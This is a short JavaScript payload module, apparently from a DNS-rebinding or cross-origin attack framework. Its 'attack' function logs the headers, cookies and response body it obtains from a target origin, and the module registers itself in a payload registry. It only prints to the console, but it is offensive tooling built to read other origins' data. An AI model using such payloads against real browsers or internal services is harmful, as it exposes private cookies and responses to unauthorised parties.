const SimpleFetchGet = () => {

    function attack(headers, cookie, body) {
        if (headers !== null) {
            console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
        };
        if (cookie !== null) {
            console.log(`Origin: ${window.location} headers: ${cookie}`);
        };
        if (body !== null) {
            console.log(`Origin: ${window.location} body:\n${body}`);
        };
    }

    function isService(headers, cookie, body) {
        return true;
    }

    function start() {
        begin('/');
    }

    return {
        attack,
        start,
        isService
    }
}

Registry.push(SimpleFetchGet());

